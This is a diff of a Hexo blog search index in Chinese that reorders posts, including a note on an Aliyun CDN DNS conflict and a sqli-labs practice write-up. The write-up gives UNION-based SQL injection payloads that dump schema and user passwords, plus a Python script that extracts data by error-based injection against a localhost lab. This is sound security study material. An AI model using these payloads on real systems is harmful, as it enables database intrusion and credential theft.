@@ -1,6 +1,42 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>阿里云CDN加速域名解析冲突问题</title>
+    <url>/2020/10/11/ALi/</url>
+    <content><![CDATA[<p>自己的个人博客搭建了也有一段时间了，以前部署在Gitee上访问速度还行，后来部署到GitHub后速度是一天不如一天了，于是想看看能不能加速一下，看了看网上的做法，我选择采用CDN加速域名。</p>
+<p>首先，你需要将域名进行备案，备案完成后才能进行后续操作。</p>
+<p>然后我选择的是阿里云的CDN（腾讯云貌似有6个月的免费试用，但是由于我是阿里云的域名，去腾讯云搞又得在那边域名备案，就放弃了）</p>
+<p>前面按照网上的步骤走都没啥问题，但当进行到向域名解析中添加一条CNAME记录时显示与A解析冲突（<strong>A解析是当初绑定域名的时候添加的</strong>），我看了看阿里云提供的Tip，但是我还是不太明白怎么操作，尝试将原来的A解析删除，换成CNAME，换完发现我的博客直接502了。后来联系阿里云客服才将问题解决。</p>
+<p>如果你也出现了同样的问题，首先，你检查一下你将顶级域名添加到CDN时设置的源站IP是不是A解析记录里的那个IP（我犯的错是将源站IP设置成了阿里云服务器的IP），如果不是，改过来，然后删除A解析，添加CNAME解析（CNAME解析的添加根据提示做就行了），然后就大功告成了。</p>
+<hr>
+<p>u1s1,阿里云的客服态度蛮好的，晚上10点多了还为我耐心解答问题，在此致谢！</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>CDN 解析冲突</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Android</title>
     <url>/2021/03/17/Android/</url>
     <content><![CDATA[<p>今天做了几个简单页面的布局设计，学到了一些新的东西，在此记录一下。</p>
@@ -71,42 +107,6 @@
       </categories>
       <tags>
         <tag>Android UI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>阿里云CDN加速域名解析冲突问题</title>
-    <url>/2020/10/11/ALi/</url>
-    <content><![CDATA[<p>自己的个人博客搭建了也有一段时间了，以前部署在Gitee上访问速度还行，后来部署到GitHub后速度是一天不如一天了，于是想看看能不能加速一下，看了看网上的做法，我选择采用CDN加速域名。</p>
-<p>首先，你需要将域名进行备案，备案完成后才能进行后续操作。</p>
-<p>然后我选择的是阿里云的CDN（腾讯云貌似有6个月的免费试用，但是由于我是阿里云的域名，去腾讯云搞又得在那边域名备案，就放弃了）</p>
-<p>前面按照网上的步骤走都没啥问题，但当进行到向域名解析中添加一条CNAME记录时显示与A解析冲突（<strong>A解析是当初绑定域名的时候添加的</strong>），我看了看阿里云提供的Tip，但是我还是不太明白怎么操作，尝试将原来的A解析删除，换成CNAME，换完发现我的博客直接502了。后来联系阿里云客服才将问题解决。</p>
-<p>如果你也出现了同样的问题，首先，你检查一下你将顶级域名添加到CDN时设置的源站IP是不是A解析记录里的那个IP（我犯的错是将源站IP设置成了阿里云服务器的IP），如果不是，改过来，然后删除A解析，添加CNAME解析（CNAME解析的添加根据提示做就行了），然后就大功告成了。</p>
-<hr>
-<p>u1s1,阿里云的客服态度蛮好的，晚上10点多了还为我耐心解答问题，在此致谢！</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>CDN 解析冲突</tag>
       </tags>
   </entry>
   <entry>
@@ -661,6 +661,154 @@ http://url/CVS/Entries 返回所有文件的结构
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs-master 刷题记录</title>
+    <url>/2020/10/18/sqlilab/</url>
+    <content><![CDATA[<h3 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h3><p>注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
+<h4 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h4><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p>
+<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
+<p>（2） 加and 1=1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=1</p>
+<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
+<p>（3） 加and 1=2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=2</p>
+<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
+<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
+<h4 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h4><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<p>例如数字型语句：select * from table where id =3</p>
+<p>则字符型如下：select * from table where name=’admin’</p>
+<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号：select * from table where name=’admin’’</p>
+<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
+<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
+<p>Mysql 有三种常用注释符：</p>
+<p>– 注意，这种注释符后边有一个空格</p>
+<p># 通过#进行注释 即**%23**</p>
+<p>/* */ 注释掉符号内的内容</p>
+<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
+<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p>查看有多少列：</p>
+<p><code>?id=1 order by 3--+</code></p>
+<p>查看所有的数据库：</p>
+<p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
+<p>查看所有的表：</p>
+<p><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code>  （<strong>0x7365637572697479对应的字符串是security</strong>）</p>
+<p>查看所有的字段：</p>
+<p><code>?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code>     (<strong>0x7573657273对应的字符串是users</strong>)</p>
+<p>查看所有用户名和密码：</p>
+<p><code>union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code></p>
+<p>（0x7e相当于’~’）</p>
+<blockquote>
+<p><strong>concat()函数</strong></p>
+<p>功能：将多个字符串连接成一个字符串。</p>
+<p>语法：concat(str1, str2,…)</p>
+<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
+<p>举例：</p>
+<p>select concat (id, name, score) as info from tt2;</p>
+<p><strong>concat_ws()函数</strong></p>
+<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
+<p>语法：concat_ws(separator, str1, str2, …)</p>
+<p><strong>group_concat()函数</strong></p>
+<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
+<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )</p>
+<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
+</blockquote>
+<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><img src="/2020/10/18/sqlilab/image-20201017183527723.png" alt="image-20201017183527723" style="zoom:67%;">
+
+<img src="/2020/10/18/sqlilab/image-20201017183732804.png" alt="image-20201017183732804" style="zoom:67%;">
+
+<p>与less -1的报错进行对比，发现多了一个<code>）</code>，查看源码：</p>
+<img src="/2020/10/18/sqlilab/1675852-20190518222124348-899747284.png" alt="img" style="zoom:67%;">
+
+<p><strong>构造id=-1’)</strong></p>
+<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><p>?id=1’没有报错，试了下?id=1”,报错如下：</p>
+<blockquote>
+<p>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use <strong>near ‘“2””)</strong> LIMIT 0,1’ at  line 1</p>
+</blockquote>
+<pre><code class="line-numbers language-php">$id = '"' . $id . '"';
+$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
+</code></pre>
+<p>查看源码，发现它在进行SQL查询前好像还做了个给id赋值的操作，测试一下这个到底会对id进行怎样的操作：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+$id=1;
+$id = '"' . $id . '"';
+echo($id);            //"1"
+</code></pre>
+<p>我们看见执行的结果是”1” 可以得知原来这个语法是个id参数加了两个双引号 并且还是右括号的注入 </p>
+<p>构造**?id=-1”)** </p>
+<h4 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘’1’’</strong> LIMIT 0,1’  at line 1</p>
+<pre><code class="line-numbers language-python">import requests
+from bs4 import BeautifulSoup
+db_name = ''
+table_list = []
+column_list = []
+url = '''http://127.0.0.1/sqli-labs-master/Less-5/?id=1'''
+### 获取当前数据库名 ###
+print('当前数据库名:')
+payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
+r = requests.get(url+payload)
+db_name = r.text.split(':')[-2]
+print('[+]' + db_name)
+### 获取表名 ###
+print('数据库%s下的表名:' % db_name)
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
+    r = requests.get(url+payload)
+    if 'group_key' not in r.text:
+        break
+    table_name = r.text.split(':')[-2]
+    table_list.append(table_name)
+    print('[+]' + table_name)
+### 获取列名 ###
+#### 这里以users表为例 ####
+print('%s表下的列名:' % table_list[-1])  ###根据我的摸索，里面的数字应该表示顺序，-1表示的应该是倒数第一个，0应该表示第一个
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    column_name = r.text.split(':')[-2]
+    column_list.append(column_name)
+    print('[+]' + column_name)
+### 获取字段值 ###
+#### 这里以username列为例 ####
+print('%s列下的字段值:' % column_list[-2])
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    dump = r.text.split(':')[-2]
+    print('[+]' + dump)
+</code></pre>
+<h4 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘“1””</strong> LIMIT 0,1’  at line 1</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MoeCTF wp</title>
     <url>/2020/08/14/moectf/</url>
     <content><![CDATA[<img src="/2020/08/14/moectf/image-20200816135721888.png" alt="image-20200816135721888" style="zoom:50%;">
@@ -859,154 +1007,6 @@ if (isset($a) &amp;&amp; !is_numeric($a) &amp;&amp; $a == 114514) {
       </categories>
       <tags>
         <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs-master 刷题记录</title>
-    <url>/2020/10/18/sqlilab/</url>
-    <content><![CDATA[<h3 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h3><p>注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
-<h4 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h4><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
-<p>测试步骤：</p>
-<p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p>
-<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
-<p>（2） 加and 1=1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=1</p>
-<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
-<p>（3） 加and 1=2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=2</p>
-<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
-<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
-<h4 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h4><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
-<p>例如数字型语句：select * from table where id =3</p>
-<p>则字符型如下：select * from table where name=’admin’</p>
-<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
-<p>测试步骤：</p>
-<p>（1） 加单引号：select * from table where name=’admin’’</p>
-<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
-<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
-<p>Mysql 有三种常用注释符：</p>
-<p>– 注意，这种注释符后边有一个空格</p>
-<p># 通过#进行注释 即**%23**</p>
-<p>/* */ 注释掉符号内的内容</p>
-<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
-<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p>查看有多少列：</p>
-<p><code>?id=1 order by 3--+</code></p>
-<p>查看所有的数据库：</p>
-<p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
-<p>查看所有的表：</p>
-<p><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code>  （<strong>0x7365637572697479对应的字符串是security</strong>）</p>
-<p>查看所有的字段：</p>
-<p><code>?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code>     (<strong>0x7573657273对应的字符串是users</strong>)</p>
-<p>查看所有用户名和密码：</p>
-<p><code>union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code></p>
-<p>（0x7e相当于’~’）</p>
-<blockquote>
-<p><strong>concat()函数</strong></p>
-<p>功能：将多个字符串连接成一个字符串。</p>
-<p>语法：concat(str1, str2,…)</p>
-<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
-<p>举例：</p>
-<p>select concat (id, name, score) as info from tt2;</p>
-<p><strong>concat_ws()函数</strong></p>
-<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
-<p>语法：concat_ws(separator, str1, str2, …)</p>
-<p><strong>group_concat()函数</strong></p>
-<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
-<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )</p>
-<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
-</blockquote>
-<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><img src="/2020/10/18/sqlilab/image-20201017183527723.png" alt="image-20201017183527723" style="zoom:67%;">
-
-<img src="/2020/10/18/sqlilab/image-20201017183732804.png" alt="image-20201017183732804" style="zoom:67%;">
-
-<p>与less -1的报错进行对比，发现多了一个<code>）</code>，查看源码：</p>
-<img src="/2020/10/18/sqlilab/1675852-20190518222124348-899747284.png" alt="img" style="zoom:67%;">
-
-<p><strong>构造id=-1’)</strong></p>
-<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><p>?id=1’没有报错，试了下?id=1”,报错如下：</p>
-<blockquote>
-<p>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use <strong>near ‘“2””)</strong> LIMIT 0,1’ at  line 1</p>
-</blockquote>
-<pre><code class="line-numbers language-php">$id = '"' . $id . '"';
-$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
-</code></pre>
-<p>查看源码，发现它在进行SQL查询前好像还做了个给id赋值的操作，测试一下这个到底会对id进行怎样的操作：</p>
-<pre><code class="line-numbers language-php">&lt;?php
-$id=1;
-$id = '"' . $id . '"';
-echo($id);            //"1"
-</code></pre>
-<p>我们看见执行的结果是”1” 可以得知原来这个语法是个id参数加了两个双引号 并且还是右括号的注入 </p>
-<p>构造**?id=-1”)** </p>
-<h4 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘’1’’</strong> LIMIT 0,1’  at line 1</p>
-<pre><code class="line-numbers language-python">import requests
-from bs4 import BeautifulSoup
-db_name = ''
-table_list = []
-column_list = []
-url = '''http://127.0.0.1/sqli-labs-master/Less-5/?id=1'''
-### 获取当前数据库名 ###
-print('当前数据库名:')
-payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
-r = requests.get(url+payload)
-db_name = r.text.split(':')[-2]
-print('[+]' + db_name)
-### 获取表名 ###
-print('数据库%s下的表名:' % db_name)
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
-    r = requests.get(url+payload)
-    if 'group_key' not in r.text:
-        break
-    table_name = r.text.split(':')[-2]
-    table_list.append(table_name)
-    print('[+]' + table_name)
-### 获取列名 ###
-#### 这里以users表为例 ####
-print('%s表下的列名:' % table_list[-1])  ###根据我的摸索，里面的数字应该表示顺序，-1表示的应该是倒数第一个，0应该表示第一个
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
-    r = requests.get(url + payload)
-    if 'group_key' not in r.text:
-        break
-    column_name = r.text.split(':')[-2]
-    column_list.append(column_name)
-    print('[+]' + column_name)
-### 获取字段值 ###
-#### 这里以username列为例 ####
-print('%s列下的字段值:' % column_list[-2])
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
-    r = requests.get(url + payload)
-    if 'group_key' not in r.text:
-        break
-    dump = r.text.split(':')[-2]
-    print('[+]' + dump)
-</code></pre>
-<h4 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘“1””</strong> LIMIT 0,1’  at line 1</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
